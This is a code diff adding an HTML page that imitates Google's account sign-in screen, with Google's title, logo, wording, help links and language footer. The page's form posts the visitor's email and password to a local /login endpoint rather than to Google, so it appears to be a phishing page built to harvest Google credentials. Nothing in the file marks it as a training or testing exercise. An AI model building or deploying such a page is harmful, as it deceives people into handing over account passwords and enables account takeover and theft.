@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+    <div class="google-container">
+        <div class="google-card">
+            <div class="google-logo">
+                <img src="/assets/logo.png" alt="Google" height="32">
+            </div>
+            <h1 class="google-title">Sign in</h1>
+            <p class="google-subtitle">Use your Google Account</p>
+            <form action="/login" method="POST">
+                <div class="google-input-group">
+                    <input type="text" name="email" placeholder="Email or phone" required>
+                    <label>Email or phone</label>
+                </div>
+                <div class="google-input-group">
+                    <input type="password" name="pass" placeholder="Password" required>
+                    <label>Password</label>
+                </div>
+                <div class="google-links">
+                    <a href="#">Forgot email?</a>
+                    <a href="#">Forgot password?</a>
+                </div>
+                <p class="google-guest">Not your computer? Use Guest mode to sign in privately.</p>
+                <div class="google-actions">
+                    <a href="#" class="google-create">Create account</a>
+                    <button type="submit" class="google-next-btn">Next</button>
+                </div>
+            </form>
+        </div>
+        <div class="google-footer">
+            <select>
+                <option>English (United States)</option>
+                <option>中文</option>
+                <option>Español</option>
+            </select>
+            <div class="google-footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
